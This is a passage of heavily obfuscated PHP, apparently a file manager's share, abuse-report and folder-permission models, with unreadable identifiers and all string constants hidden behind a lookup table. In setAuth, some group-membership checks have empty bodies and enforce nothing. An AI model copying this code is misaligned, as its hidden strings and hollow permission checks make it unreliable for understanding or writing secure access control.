$¿ò‰²á’[191] ? 0 : USER_ID; $ôÇ‡Á­í = array($¿ò‰²á’[500] => $«¸½ñ¶Ğ, $¿ò‰²á’[1761] => $™…çÍÛŠ); if ($«¸½ñ¶Ğ == 0) { $ôÇ‡Á­í = array($¿ò‰²á’[2131] => $¿½â˜Á[$¿ò‰²á’[1258]], $¿ò‰²á’[1761] => $™…çÍÛŠ); } if ($Õ‡ÈÇæ = $this->where($ôÇ‡Á­í)->find()) { return $Õ‡ÈÇæ[$¿ò‰²á’[674]]; } if ($«¸½ñ¶Ğ == 0) { $Ş§£âî¥ = array($¿ò‰²á’[32] => get_path_this($¿½â˜Á[$¿ò‰²á’[87]])); } else { $Ş§£âî¥ = Model($¿ò‰²á’[904])->sourceInfo($«¸½ñ¶Ğ); if (!$Ş§£âî¥) { return !1; } } if (!$¿½â˜Á[$¿ò‰²á’[1659]]) { $¿½â˜Á[$¿ò‰²á’[1659]] = $Ş§£âî¥[$¿ò‰²á’[32]]; } $ö‚Ÿî†‘ = array($¿ò‰²á’[1761] => $™…çÍÛŠ, $¿ò‰²á’[500] => $«¸½ñ¶Ğ, $¿ò‰²á’[1659] => $¿ò‰²á’[12], $¿ò‰²á’[571] => 0, $¿ò‰²á’[672] => 0, $¿ò‰²á’[1258] => $¿ò‰²á’[12], $¿ò‰²á’[383] => $¿ò‰²á’[12], $¿ò‰²á’[968] => $¿ò‰²á’[12], $¿ò‰²á’[2132] => 0, $¿ò‰²á’[2133] => 0, $¿ò‰²á’[841] => 0, $¿ò‰²á’[2134] => $¿ò‰²á’[12], $¿ò‰²á’[2115] => $¿ò‰²á’[12]); $·ğç‘ªô = explode($¿ò‰²á’[50], $¿ò‰²á’[2135]); foreach ($·ğç‘ªô as $ãôõ¢¢î) { if (!isset($¿½â˜Á[$ãôõ¢¢î])) { continue; } $ö‚Ÿî†‘[$ãôõ¢¢î] = $¿½â˜Á[$ãôõ¢¢î]; } $ Á¥âÜ = $this->add($ö‚Ÿî†‘); $“Ñ•î» = array($¿ò‰²á’[2115] => short_id($ Á¥âÜ)); $this->where(array($¿ò‰²á’[2136] => $ Á¥âÜ))->save($“Ñ•î»); return $ Á¥âÜ; } private function _shareAuthSet($•Á¬ºì, $ÒÜâè) { $¼øƒùÔ =& $_SERVER[ç¦¬”œš]; if (!is_array($ÒÜâè)) { return !1; } $÷ğÛÁƒ‹ = Model($¼øƒùÔ[2081]); $÷ğÛÁƒ‹->where(array($¼øƒùÔ[674] => $•Á¬ºì))->delete(); $äõ¦Æ´é = array(); foreach ($ÒÜâè as $È·ğÓÀÆ) { $ºÅñÔ = SourceModel::TYPE_USER; if ($È·ğÓÀÆ[$¼øƒùÔ[190]] == SourceModel::TYPE_GROUP) { $ºÅñÔ = SourceModel::TYPE_GROUP; } $ÒÑËÎˆí = array($¼øƒùÔ[674] => $•Á¬ºì, $¼øƒùÔ[190] => $ºÅñÔ, $¼øƒùÔ[578] => intval($È·ğÓÀÆ[$¼øƒùÔ[578]]), $¼øƒùÔ[2077] => 0, $¼øƒùÔ[2137] => -1); if ($È·ğÓÀÆ[$¼øƒùÔ[2077]]) { $ÒÑËÎˆí[$¼øƒùÔ[2077]] = $È·ğÓÀÆ[$¼øƒùÔ[2077]]; } else { if ($È·ğÓÀÆ[$¼øƒùÔ[2137]]) { $ÒÑËÎˆí[$¼øƒùÔ[2137]] = $È·ğÓÀÆ[$¼øƒùÔ[2137]]; } } $äõ¦Æ´é[] = $ÒÑËÎˆí; } return $÷ğÛÁƒ‹->addAll($äõ¦Æ´é, array(), !0); } public function numViewAdd($¸Ó¼àª¶) { $ –‚ÇÛñ =& $_SERVER[ç¦¬”œš]; $Éîø´¬¸ = array($ –‚ÇÛñ[2136] => $¸Ó¼àª¶); $this->where($Éîø´¬¸)->setAdd($ –‚ÇÛñ[2132]); } public function numDownloadAdd($¶ØäÌÛ) { $œ»Áä³ =& $_SERVER[ç¦¬”œš]; $É×Ê–ÜŠ = array($œ»Áä³[2136] => $¶ØäÌÛ); $this->where($É×Ê–ÜŠ)->setAdd($œ»Áä³[2133]); } protected function shareEdit($Ê¼“ä¤™, $·òä­Âµ) { $öö©¼è– =& $_SERVER[ç¦¬”œš]; $÷…ÁÎÚÇ = $this->getInfo($Ê¼“ä¤™); if (!$÷…ÁÎÚÇ) { return !1; } $this->_checkLinkShare($·òä­Âµ, $÷…ÁÎÚÇ); $şıòÒı = array(); $âÅœÇôƒ = explode($öö©¼è–[50], $öö©¼è–[2138]); foreach ($âÅœÇôƒ as $Ÿğµ¯½í) { if (!array_key_exists($Ÿğµ¯½í, $·òä­Âµ)) { continue; } $şıòÒı[$Ÿğµ¯½í] = $·òä­Âµ[$Ÿğµ¯½í]; } $this->shareEventAdd($÷…ÁÎÚÇ[$öö©¼è–[193]], $·òä­Âµ, $öö©¼è–[1938]); $this->where(array($öö©¼è–[2136] => $Ê¼“ä¤™))->save($şıòÒı); if (isset($·òä­Âµ[$öö©¼è–[2124]])) { $this->_shareAuthSet($Ê¼“ä¤™, $·òä­Âµ[$öö©¼è–[2124]]); } return !0; } private function _checkLinkShare($’¹áÔ¤¬, $úÊøú¿) { $áèíı¹ =& $_SERVER[ç¦¬”œš]; if ($’¹áÔ¤¬[$áèíı¹[571]] != $áèíı¹[91]) { return; } $¯üå‰¸Û = $úÊøú¿[$áèíı¹[90]][$áèíı¹[193]]; if ($úÊøú¿[$áèíı¹[90]][$áèíı¹[33]] != $áèíı¹[230]) { $âÊ¬ĞÕ± = $this->_folderReport($¯üå‰¸Û); if (!$âÊ¬ĞÕ±) { return; } show_json(LNG($áèíı¹[2139]) . $áèíı¹[2140] . $âÊ¬ĞÕ±, !1); } $Ÿ‡Ğç˜ = Model($áèíı¹[904])->fileInfoGet($úÊøú¿[$áèíı¹[90]][$áèíı¹[193]]); if (!$Ÿ‡Ğç˜) { return; } $ú¡şÀÜ® = $this->shareFileMeta($Ÿ‡Ğç˜[$áèíı¹[550]]); if (isset($ú¡şÀÜ®[$áèíı¹[450]]) && $ú¡şÀÜ®[$áèíı¹[450]] == $áèíı¹[91]) { show_json(LNG($áèíı¹[2141]), !1); } } private function _folderReport($‘ğÕÈ‡—) { $¾Ş¨îÅÁ =& $_SERVER[ç¦¬”œš]; $Êò¢Ô÷£ = array($¾Ş¨îÅÁ[550] => array($¾Ş¨îÅÁ[1091], 0), $¾Ş¨îÅÁ[830] => 3); $é¹Å”Ş = Model($¾Ş¨îÅÁ[2142])->where($Êò¢Ô÷£)->field($¾Ş¨îÅÁ[550])->select(); if (!$é¹Å”Ş) { return !1; } $é¹Å”Ş = array_to_keyvalue($é¹Å”Ş, $¾Ş¨îÅÁ[12], $¾Ş¨îÅÁ[550]); $«Ÿœ«Êí = $¾Ş¨îÅÁ[50] . $‘ğÕÈ‡— . $¾Ş¨îÅÁ[50]; $Êò¢Ô÷£ = array($¾Ş¨îÅÁ[550] => array($¾Ş¨îÅÁ[7], $é¹Å”Ş), $¾Ş¨îÅÁ[593] => array($¾Ş¨îÅÁ[459], "\45{$«Ÿœ«Êí}\x25"), $¾Ş¨îÅÁ[514] => 0); $úÑüœÎë = Model($¾Ş¨îÅÁ[904])->where($Êò¢Ô÷£)->field($¾Ş¨îÅÁ[2143])->find(); if (!$úÑüœÎë) { return !1; } $Çèâˆ©Â = substr($úÑüœÎë[$¾Ş¨îÅÁ[593]], strpos($úÑüœÎë[$¾Ş¨îÅÁ[593]], $«Ÿœ«Êí)); $Êò¢Ô÷£ = array($¾Ş¨îÅÁ[193] => array($¾Ş¨îÅÁ[7], trim($Çèâˆ©Â, $¾Ş¨îÅÁ[50]))); $ûšøœó˜ = Model($¾Ş¨îÅÁ[904])->where($Êò¢Ô÷£)->field($¾Ş¨îÅÁ[32])->select(); $ÎèáµÈº = array_to_keyvalue($ûšøœó˜, $¾Ş¨îÅÁ[12], $¾Ş¨îÅÁ[32]); $ÎèáµÈº[] = $úÑüœÎë[$¾Ş¨îÅÁ[32]]; return implode($¾Ş¨îÅÁ[8], $ÎèáµÈº); } protected function remove($œñˆÏ¯) { $šìœ¤ç =& $_SERVER[ç¦¬”œš]; $¢¬Ö«ü§ = is_array($œñˆÏ¯) ? $œñˆÏ¯ : array($œñˆÏ¯); for ($º÷ÅÈ»é = 0; $º÷ÅÈ»é < count($¢¬Ö«ü§); $º÷ÅÈ»é++) { $ì±ìñ®¡ = $this->getInfo($¢¬Ö«ü§[$º÷ÅÈ»é]); if ($ì±ìñ®¡[$šìœ¤ç[672]] == $šìœ¤ç[91]) { Model($šìœ¤ç[642])->eventShare($ì±ìñ®¡[$šìœ¤ç[193]], $šìœ¤ç[2130]); } if ($ì±ìñ®¡[$šìœ¤ç[571]] == $šìœ¤ç[91]) { Model($šìœ¤ç[642])->eventShare($ì±ìñ®¡[$šìœ¤ç[193]], $šìœ¤ç[2129]); } } if (is_array($œñˆÏ¯)) { $œñˆÏ¯ = array($šìœ¤ç[7], $œñˆÏ¯); } $î²®÷á = array($šìœ¤ç[674] => $œñˆÏ¯); $½ÈĞŠİî = $this->where($î²®÷á)->delete(); if ($½ÈĞŠİî) { Model($šìœ¤ç[675])->where(array($šìœ¤ç[674] => $œñˆÏ¯))->delete(); } return $½ÈĞŠİî; } protected function removeBySource($ÓÛ™Èø¾) { $èòø¦æî =& $_SERVER[ç¦¬”œš]; $ÄŠ—‡ = array($èòø¦æî[500] => array($èòø¦æî[501], $ÓÛ™Èø¾)); $ä¹ÓÇ¹Ÿ = $this->field($èòø¦æî[674])->where($ÄŠ—‡)->select(); $ä¹ÓÇ¹Ÿ = array_to_keyvalue($ä¹ÓÇ¹Ÿ, $èòø¦æî[12], $èòø¦æî[674]); if (!$ä¹ÓÇ¹Ÿ) { return; } $ÄŠ—‡ = array($èòø¦æî[2136] => array($èòø¦æî[501], $ä¹ÓÇ¹Ÿ)); $this->where($ÄŠ—‡)->delete(); Model($èòø¦æî[675])->where($ÄŠ—‡)->delete(); } public function listAll($ı»ŠÚ±) { $ûÆÓºÉ• =& $_SERVER[ç¦¬”œš]; $şæ’ÄÃÉ = array(); if ($ı»ŠÚ±[$ûÆÓºÉ•[1770]]) { $şæ’ÄÃÉ[$ûÆÓºÉ•[1770]] = $ı»ŠÚ±[$ûÆÓºÉ•[1770]]; } if ($ı»ŠÚ±[$ûÆÓºÉ•[840]]) { $ÙæáòÚ = $ı»ŠÚ±[$ûÆÓºÉ•[841]] ? $ı»ŠÚ±[$ûÆÓºÉ•[841]] : strtotime(date($ûÆÓºÉ•[2144])); $şæ’ÄÃÉ[$ûÆÓºÉ•[231]] = array($ûÆÓºÉ•[409], array($ı»ŠÚ±[$ûÆÓºÉ•[840]], $ÙæáòÚ)); } if ($ı»ŠÚ±[$ûÆÓºÉ•[33]]) { $şæ’ÄÃÉ[$ı»ŠÚ±[$ûÆÓºÉ•[33]]] = 1; } else { $şæ’ÄÃÉ[] = array($ûÆÓºÉ•[571] => array($ûÆÓºÉ•[1091], 0), $ûÆÓºÉ•[672] => array($ûÆÓºÉ•[1091], 0), $ûÆÓºÉ•[2118] => $ûÆÓºÉ•[2071]); } if ($ı»ŠÚ±[$ûÆÓºÉ•[2067]]) { $şæ’ÄÃÉ[] = array($ûÆÓºÉ•[2115] => $ı»ŠÚ±[$ûÆÓºÉ•[2067]], $ûÆÓºÉ•[1659] => array($ûÆÓºÉ•[459], "\45{$ı»ŠÚ±[$ûÆÓºÉ•[2067]]}\45"), $ûÆÓºÉ•[2118] => $ûÆÓºÉ•[2071]); } $¯şñØ˜ó = $this->_makeOrder()->where($şæ’ÄÃÉ)->selectPage(20); if (empty($¯şñØ˜ó[$ûÆÓºÉ•[445]])) { return array(); } $this->_listDataApply($¯şñØ˜ó[$ûÆÓºÉ•[445]]); return $¯şñØ˜ó; } public function listDataApply($ŒèÆšÍÁ) { $this->_listDataApply($ŒèÆšÍÁ); return $ŒèÆšÍÁ; } private function _listDataApply(&$ªÔ˜œ) { $³—À—¸ =& $_SERVER[ç¦¬”œš]; $…²£ÄÌñ = array_to_keyvalue($ªÔ˜œ, $³—À—¸[12], $³—À—¸[1770]); $…˜ˆ‹¦ü = Model($³—À—¸[607])->userListInfo(array_unique($…²£ÄÌñ)); $ÈÇİ—ïÀ = array_to_keyvalue($ªÔ˜œ, $³—À—¸[12], $³—À—¸[193]); $ Ì»¹Ûª = Model($³—À—¸[904])->sourceListInfo($ÈÇİ—ïÀ, !0); foreach ($ªÔ˜œ as $Ò®áÙÄˆ => &$¯Ò„ÖÂß) { $âıê¡› = $¯Ò„ÖÂß[$³—À—¸[1770]]; $¯Ò„ÖÂß[$³—À—¸[2145]] = $…˜ˆ‹¦ü[$âıê¡›] ? $…˜ˆ‹¦ü[$âıê¡›] : !1; $ş‚·‰Îß = $¯Ò„ÖÂß[$³—À—¸[193]]; $¯Ò„ÖÂß[$³—À—¸[90]] = $ Ì»¹Ûª[$ş‚·‰Îß] ? $ Ì»¹Ûª[$ş‚·‰Îß] : !1; if ($¯Ò„ÖÂß[$³—À—¸[90]][$³—À—¸[514]] == $³—À—¸[91]) { unset($ªÔ˜œ[$Ò®áÙÄˆ]); } if ($¯Ò„ÖÂß[$³—À—¸[90]] != $³—À—¸[228] && !$¯Ò„ÖÂß[$³—À—¸[90]]) { unset($ªÔ˜œ[$Ò®áÙÄˆ]); } } unset($¯Ò„ÖÂß); $ªÔ˜œ = array_values($ªÔ˜œ); } private function _makeOrder($¬²ûù® = '') { $ıÍõåÄœ =& $_SERVER[ç¦¬”œš]; $ÆùÊç£Ï = array($ıÍõåÄœ[231], $ıÍõåÄœ[841], $ıÍõåÄœ[2132], $ıÍõåÄœ[2133]); $ÄŒ±ŒÁ = array($ıÍõåÄœ[532] => $ıÍõåÄœ[533], $ıÍõåÄœ[534] => $ıÍõåÄœ[535]); $´–ãØ÷˜ = Input::get($ıÍõåÄœ[539], $ıÍõåÄœ[7], $ıÍõåÄœ[506], $ÆùÊç£Ï); $²âÑ¢« = Input::get($ıÍõåÄœ[540], $ıÍõåÄœ[7], $ıÍõåÄœ[2146], array($ıÍõåÄœ[2064], $ıÍõåÄœ[534])); $²âÑ¢« = $ÄŒ±ŒÁ[$²âÑ¢«]; $¬²ûù® = $¬²ûù® . "{$´–ãØ÷˜}\40{$²âÑ¢«}"; return $this->order($¬²ûù®); } public function reportAdd($²å±å¿Ø) { $Ÿâ³à÷ =& $_SERVER[ç¦¬”œš]; $ëó­¹ÒØ = array($Ÿâ³à÷[674] => $²å±å¿Ø[$Ÿâ³à÷[674]], $Ÿâ³à÷[1770] => USER_ID); if (Model($Ÿâ³à÷[2142])->where($ëó­¹ÒØ)->find()) { return !1; } $¥å§… = array($Ÿâ³à÷[674] => $²å±å¿Ø[$Ÿâ³à÷[674]], $Ÿâ³à÷[1659] => $²å±å¿Ø[$Ÿâ³à÷[1659]], $Ÿâ³à÷[193] => $²å±å¿Ø[$Ÿâ³à÷[193]], $Ÿâ³à÷[550] => $²å±å¿Ø[$Ÿâ³à÷[550]], $Ÿâ³à÷[1770] => USER_ID, $Ÿâ³à÷[33] => $²å±å¿Ø[$Ÿâ³à÷[33]], $Ÿâ³à÷[535] => $²å±å¿Ø[$Ÿâ³à÷[535]]); return Model($Ÿâ³à÷[2142])->add($¥å§…); } public function reportList($ŒîùØêç) { $›«ëº¤Ú =& $_SERVER[ç¦¬”œš]; $±€ªûöÍ = array(); if ($ŒîùØêç[$›«ëº¤Ú[840]]) { $”×²øŠÇ = $ŒîùØêç[$›«ëº¤Ú[841]] ? $ŒîùØêç[$›«ëº¤Ú[841]] : strtotime(date($›«ëº¤Ú[2144])); $±€ªûöÍ[$›«ëº¤Ú[231]] = array($›«ëº¤Ú[409], array($ŒîùØêç[$›«ëº¤Ú[840]], $”×²øŠÇ)); } if (isset($ŒîùØêç[$›«ëº¤Ú[33]]) && in_array($ŒîùØêç[$›«ëº¤Ú[33]], array($›«ëº¤Ú[91], $›«ëº¤Ú[519], $›«ëº¤Ú[2147], $›«ëº¤Ú[2148], $›«ëº¤Ú[2149]))) { $±€ªûöÍ[$›«ëº¤Ú[33]] = $ŒîùØêç[$›«ëº¤Ú[33]]; } if (isset($ŒîùØêç[$›«ëº¤Ú[830]]) && in_array($ŒîùØêç[$›«ëº¤Ú[830]], array($›«ëº¤Ú[228], $›«ëº¤Ú[91], $›«ëº¤Ú[519], $›«ëº¤Ú[2147]))) { $±€ªûöÍ[$›«ëº¤Ú[830]] = $ŒîùØêç[$›«ëº¤Ú[830]]; } $¹Ëƒ”ï° = Input::get($›«ëº¤Ú[540], $›«ëº¤Ú[7], $›«ëº¤Ú[2146], array($›«ëº¤Ú[2064], $›«ëº¤Ú[534])); $ŒŒË‹ƒï = array($›«ëº¤Ú[532] => $›«ëº¤Ú[533], $›«ëº¤Ú[534] => $›«ëº¤Ú[535]); $˜×­œšì = $›«ëº¤Ú[2150] . $ŒŒË‹ƒï[$¹Ëƒ”ï°]; $íÄœÄ¸† = Model($›«ëº¤Ú[2142])->where($±€ªûöÍ)->order($˜×­œšì)->selectPage(20); if (empty($íÄœÄ¸†[$›«ëº¤Ú[445]])) { return array(); } $˜²´Ğ˜ = array_to_keyvalue_group($íÄœÄ¸†[$›«ëº¤Ú[445]], $›«ëº¤Ú[830], $›«ëº¤Ú[674]); if (!empty($˜²´Ğ˜[0])) { $ŒîùØêç = $˜²´Ğ˜[0]; $±€ªûöÍ = array($›«ëº¤Ú[674] => array($›«ëº¤Ú[7], $ŒîùØêç)); $áüõ¢¹„ = $this->where($±€ªûöÍ)->field($›«ëº¤Ú[674])->select(); $áüõ¢¹„ = array_to_keyvalue($áüõ¢¹„, $›«ëº¤Ú[12], $›«ëº¤Ú[674]); $¾Ò¤†Æ = array_diff($ŒîùØêç, $áüõ¢¹„); if (!empty($¾Ò¤†Æ)) { foreach ($íÄœÄ¸†[$›«ëº¤Ú[445]] as $‚¢‚Éßê => $Í«—¶–“) { if (in_array($Í«—¶–“[$›«ëº¤Ú[674]], $¾Ò¤†Æ)) { unset($íÄœÄ¸†[$›«ëº¤Ú[445]][$‚¢‚Éßê]); } } } } $this->_listDataApply($íÄœÄ¸†[$›«ëº¤Ú[445]]); return $íÄœÄ¸†; } public function reportStatus($¤ø¤ï°) { $™Œû‡À‘ =& $_SERVER[ç¦¬”œš]; $İ³ı²»« = array($™Œû‡À‘[484] => $¤ø¤ï°[$™Œû‡À‘[484]]); $çÁœ§Šõ = Model($™Œû‡À‘[2142])->where($İ³ı²»«)->field($™Œû‡À‘[2151])->find(); if (!$çÁœ§Šõ) { return !1; } $ì®œŞµœ = array($™Œû‡À‘[830] => $¤ø¤ï°[$™Œû‡À‘[830]]); if ($¤ø¤ï°[$™Œû‡À‘[830]] == $™Œû‡À‘[2147] && $çÁœ§Šõ[$™Œû‡À‘[830]] == $™Œû‡À‘[2147]) { $ì®œŞµœ[$™Œû‡À‘[830]] = 0; } $úêÏ¢®ü = Model($™Œû‡À‘[2142])->where($İ³ı²»«)->save($ì®œŞµœ); if ($¤ø¤ï°[$™Œû‡À‘[830]] == $™Œû‡À‘[519]) { if ($çÁœ§Šõ[$™Œû‡À‘[550]] != $™Œû‡À‘[228] && $this->shareFileMeta($çÁœ§Šõ[$™Œû‡À‘[550]])) { $this->shareFileMeta($çÁœ§Šõ[$™Œû‡À‘[550]], 0); } $this->remove($çÁœ§Šõ[$™Œû‡À‘[674]]); return !0; } if ($úêÏ¢®ü && $¤ø¤ï°[$™Œû‡À‘[830]] == $™Œû‡À‘[2147]) { $­å­Üàá = $ì®œŞµœ[$™Œû‡À‘[830]] == $™Œû‡À‘[2147] ? 1 : 0; $this->shareFileMeta($çÁœ§Šõ[$™Œû‡À‘[550]], $­å­Üàá); $this->removeByFile($çÁœ§Šõ[$™Œû‡À‘[550]]); } return $úêÏ¢®ü; } private function removeByFile($¿«‚ â„) { $ÌÛÔ˜½Ä =& $_SERVER[ç¦¬”œš]; $ï¥òîªÉ = Model($ÌÛÔ˜½Ä[904])->where(array($ÌÛÔ˜½Ä[550] => $¿«‚ â„))->field($ÌÛÔ˜½Ä[193])->select(); $ó£Ø½ì± = array_to_keyvalue($ï¥òîªÉ, $ÌÛÔ˜½Ä[12], $ÌÛÔ˜½Ä[193]); $··ÔÇÍÌ = array($ÌÛÔ˜½Ä[193] => array($ÌÛÔ˜½Ä[7], $ó£Ø½ì±), $ÌÛÔ˜½Ä[571] => 1); $ï¥òîªÉ = $this->where($··ÔÇÍÌ)->field($ÌÛÔ˜½Ä[674])->select(); if (empty($ï¥òîªÉ)) { return; } $ë§’…˜¦ = array_to_keyvalue($ï¥òîªÉ, $ÌÛÔ˜½Ä[12], $ÌÛÔ˜½Ä[674]); $this->remove($ë§’…˜¦); } private function shareFileMeta($å¯Ü…ô’, $Ù­Ã¦õ = null) { $Á®–‹†õ =& $_SERVER[ç¦¬”œš]; $ÓÅÎ˜ = array($Á®–‹†õ[550] => $å¯Ü…ô’, $Á®–‹†õ[97] => $Á®–‹†õ[2152]); if (is_null($Ù­Ã¦õ)) { return Model($Á®–‹†õ[2153])->where($ÓÅÎ˜)->find(); } $ÓÅÎ˜[$Á®–‹†õ[450]] = $Ù­Ã¦õ; Model($Á®–‹†õ[2153])->add($ÓÅÎ˜, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\x63\x65\137\141\165\x74\x68"; public function getAuth($¨ÅùÉËĞ) { $õı¨Ì¿ =& $_SERVER[ç¦¬”œš]; $¿ÎÌÂ¿Ô = $this->sourceAuthSelect($¨ÅùÉËĞ); $ÙË²õ‡ö = array(); $ì¦ï¥òÜ = array(); $Çö”ù® = 2 << 25; foreach ($¿ÎÌÂ¿Ô as $ù×˜‘) { $ÎöŞ½éı = Model($õı¨Ì¿[580])->listData($ù×˜‘[$õı¨Ì¿[2077]]); if (!$ÎöŞ½éı) { continue; } $ÙË²õ‡ö[] = $ù×˜‘; $öŞ†‚ç = 0; if ($ù×˜‘[$õı¨Ì¿[190]] == SourceModel::TYPE_GROUP) { $öŞ†‚ç = $Çö”ù® * 2; } if ($ù×˜‘[$õı¨Ì¿[190]] == SourceModel::TYPE_USER) { $öŞ†‚ç = $Çö”ù®; } if ($ù×˜‘[$õı¨Ì¿[190]] == SourceModel::TYPE_USER && $ù×˜‘[$õı¨Ì¿[578]] == $õı¨Ì¿[228]) { $öŞ†‚ç = 0; } $ì¦ï¥òÜ[] = $ÎöŞ½éı[$õı¨Ì¿[496]] + $öŞ†‚ç; } array_multisort($ì¦ï¥òÜ, SORT_DESC, $ÙË²õ‡ö); return $ÙË²õ‡ö; } public function sourceAuthSelect($¹Æ…şú) { $âîÑ£ =& $_SERVER[ç¦¬”œš]; static $Ş¦Ãª«— = array(); $¾ãÛ£ô´ = is_array($¹Æ…şú) ? !1 : !0; if ($¾ãÛ£ô´) { $¹Æ…şú = array($¹Æ…şú); } $ÌÎ¨ÀÚ = array(); foreach ($¹Æ…şú as $ó°†«Ú†) { if (isset($Ş¦Ãª«—[$ó°†«Ú†])) { $ÌÎ¨ÀÚ[$ó°†«Ú†] = $Ş¦Ãª«—[$ó°†«Ú†]; } } if (count($ÌÎ¨ÀÚ) == count($¹Æ…şú)) { return $¾ãÛ£ô´ ? $ÌÎ¨ÀÚ[$¹Æ…şú[0]] : $ÌÎ¨ÀÚ; } $Á‹ÉÃ‚ = $âîÑ£[2154]; $‚ğäİ¼È = array($âîÑ£[193] => array($âîÑ£[7], $¹Æ…şú)); $¹ƒË† = $this->field($Á‹ÉÃ‚)->order($âîÑ£[484])->where($‚ğäİ¼È)->select(); $ ¢‘Ù©‘ = array_to_keyvalue_group($¹ƒË†, $âîÑ£[193]); foreach ($¹Æ…şú as $ó°†«Ú†) { $Ş¦Ãª«—[$ó°†«Ú†] = $ ¢‘Ù©‘[$ó°†«Ú†] ? $ ¢‘Ù©‘[$ó°†«Ú†] : array(); } if ($¾ãÛ£ô´) { return $¹ƒË†; } return $ ¢‘Ù©‘; } public function setAuth($½ìüÜÁ’, $—«˜ÅÌÃ) { $øËŠ½š =& $_SERVER[ç¦¬”œš]; $ëç´àŒû = Model($øËŠ½š[1419])->sourceInfo($½ìüÜÁ’); if (!$ëç´àŒû) { return !1; } if ($ëç´àŒû[$øËŠ½š[190]] != SourceModel::TYPE_GROUP) { return !1; } $¥éúæÖ = 1; $–òµÇŞ’ = $ëç´àŒû[$øËŠ½š[578]]; if ($–òµÇŞ’ != $¥éúæÖ) { $¬—±£÷ = array($øËŠ½š[1969] => $–òµÇŞ’); $ãØÇç´ = Model($øËŠ½š[2063])->field($øËŠ½š[1770])->where($¬—±£÷)->select(); $ãØÇç´ = array_to_keyvalue($ãØÇç´, $øËŠ½š[12], $øËŠ½š[1770]); } $Ã¿æÇÉ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¢üÓÜ‘ñ = array(); foreach ($—«˜ÅÌÃ as $ÕÛÅÃÒş) { if (!in_array($ÕÛÅÃÒş[$øËŠ½š[190]], $Ã¿æÇÉ)) { show_json(LNG($øËŠ½š[2155]), !1); } if ($–òµÇŞ’ != $¥éúæÖ) { if ($ÕÛÅÃÒş[$øËŠ½š[190]] == SourceModel::TYPE_GROUP) { } if ($ÕÛÅÃÒş[$øËŠ½š[578]] != 0 && !in_array($ÕÛÅÃÒş[$øËŠ½š[578]], $ãØÇç´)) { } } if ($ÕÛÅÃÒş[$øËŠ½š[578]] == 0) { $ÕÛÅÃÒş[$øËŠ½š[190]] = SourceModel::TYPE_USER; } $¢üÓÜ‘ñ[] = array($øËŠ½š[193] => $½ìüÜÁ’, $øËŠ½š[190] => intval($ÕÛÅÃÒş[$øËŠ½š[190]]), $øËŠ½š[578] => intval($ÕÛÅÃÒş[$øËŠ½š[578]]), $øËŠ½š[2077] => intval($ÕÛÅÃÒş[$øËŠ½š[2077]]) ? intval($ÕÛÅÃÒş[$øËŠ½š[2077]]) : 0, $øËŠ½š[2137] => intval($ÕÛÅÃÒş[$øËŠ½š[2137]]) ? intval($ÕÛÅÃÒş[$øËŠ½š[2137]]) : -1); } $this->where(array($øËŠ½š[500] => $½ìüÜÁ’))->delete(); $this->addAll($¢üÓÜ‘ñ); return !0; } public function authClear($×ˆö¥¶) { $ëê®¬•Ú =& $_SERVER[ç¦¬”œš]; $èë‘„Ã = Model($ëê®¬•Ú[1419])->sourceInfo($×ˆö¥¶); $ÖÆ½˜Ê¨ = array($×ˆö¥¶); if ($èë‘„Ã[$ëê®¬•Ú[494]] == $ëê®¬•Ú[91]) { $Æºí»¤¾ = array($ëê®¬•Ú[661] => array($ëê®¬•Ú[621], $èë‘„Ã[$ëê®¬•Ú[593]] . $×ˆö¥¶ . $ëê®¬•Ú[622])); $ÖÆ½˜Ê¨ = Model($ëê®¬•Ú[1419])->field($ëê®¬•Ú[500])->where($Æºí»¤¾)->getField($ëê®¬•Ú[193], !0); $ÖÆ½˜Ê¨[] = $×ˆö¥¶; } $this->where(array($ëê®¬•Ú[500] => array($ëê®¬•Ú[501], $ÖÆ½˜Ê¨)))->delete(); return !0; } public function getAllChildren($Õ’ôù€Ä) { $Ã¶Æ¼ç =& $_SERVER[ç¦¬”œš]; $„ä¡ºòö = Model($Ã¶Æ¼ç[1419])->sourceInfo($Õ’ôù€Ä); if ($„ä¡ºòö[$Ã¶Æ¼ç[494]] != $Ã¶Æ¼ç[91]) { return $this->sourceListAuth(array($Õ’ôù€Ä)); } if ($„ä¡ºòö[$Ã¶Æ¼ç[190]] != SourceModel::TYPE_GROUP) { return array(); } $¦—åøí½ = 1; $ëú¹¬Ô = array($Õ’ôù€Ä); if ($„ä¡ºòö[$Ã¶Æ¼ç[192]] == $Ã¶Æ¼ç[228] && $„ä¡ºòö[$Ã¶Æ¼ç[578]] != $¦—åøí½) { $ëú¹¬Ô = $this->groupChidldAllRootSource($„ä¡ºòö[$Ã¶Æ¼ç[578]]); } $ş·îŠ½ = $this->field($Ã¶Æ¼ç[193])->group($Ã¶Æ¼ç[193])->select(); $ş·îŠ½ = array_to_keyvalue($ş·îŠ½, $Ã¶Æ¼ç[12], $Ã¶Æ¼ç[193]); if (!$ş·îŠ½) { return array(); } $±õî˜«‡ = $Ã¶Æ¼ç[2156]; $áÉ˜×Æš = array($Ã¶Æ¼ç[193] => array($Ã¶Æ¼ç[7], $ş·îŠ½), $Ã¶Æ¼ç[514] => $Ã¶Æ¼ç[228]); $Êì¹Í”ã = Model($Ã¶Æ¼ç[904])->field($±õî˜«‡)->where($áÉ˜×Æš)->select(); $ÏÌœĞ¿Á = array($Õ’ôù€Ä); foreach ($Êì¹Í”ã as $•û©‘ôõ) { foreach ($ëú¹¬Ô as $‡­œ¨×) { $“¸Ã˜‹¹ = $Ã¶Æ¼ç[50] . $‡­œ¨× . $Ã¶Æ¼ç[50]; $ìù° ¾Î = $•û©‘ôõ[$Ã¶Æ¼ç[593]] . $•û©‘ôõ[$Ã¶Æ¼ç[193]] . $Ã¶Æ¼ç[50]; if (strstr($ìù° ¾Î, $“¸Ã˜‹¹)) { $ÏÌœĞ¿Á[] = $•û©‘ôõ[$Ã¶Æ¼ç[193]]; break; } } } return $this->sourceListAuth($ÏÌœĞ¿Á); } private function sourceListAuth($Í½ªï´Ÿ) { $Ê„ªûÇÉ =& $_SERVER[ç¦¬”œš]; $…õİçÌñ = Model($Ê„ªûÇÉ[1419])->sourceListInfo($Í½ªï´Ÿ, !0); $‡ıŸàè = $this->sourceAuthSelect($Í½ªï´Ÿ); $‘ûäìÛ‹ = array(); $Üı“†ù£ = array(); foreach ($…õİçÌñ as $çÙÈÏ£¾) { unset($çÙÈÏ£¾[$Ê„ªûÇÉ[538]]); 